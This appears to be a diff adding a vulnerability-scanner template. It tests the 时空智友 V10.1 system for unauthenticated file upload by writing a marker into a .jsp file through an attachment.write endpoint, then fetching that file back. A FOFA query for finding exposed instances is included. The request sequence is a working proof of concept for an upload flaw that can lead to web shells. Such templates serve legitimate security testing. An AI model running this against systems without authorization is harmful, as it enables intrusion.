@@ -1,0 +1,44 @@
+id: shikong
+info:
+  name: xxx
+  author: mike
+  severity: info
+  description: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="时空智友V10.1"
+http:
+  - raw:
+      - |
+        POST /formservice?service=attachment.write&isattach=false&filename=mikes.jsp HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: keep-alive
+        Content-Length: 9
+
+        20231101
+
+      - |
+        GET /form/temp/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate        
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "20231101"
+    extractors:
+      - type: regex # type of the extractor
+        part: body
+        name: filename
+        internal: true # Required for using dynamic variables
+        group: 1
+        regex:
+          - "<root>(.*)</root>"
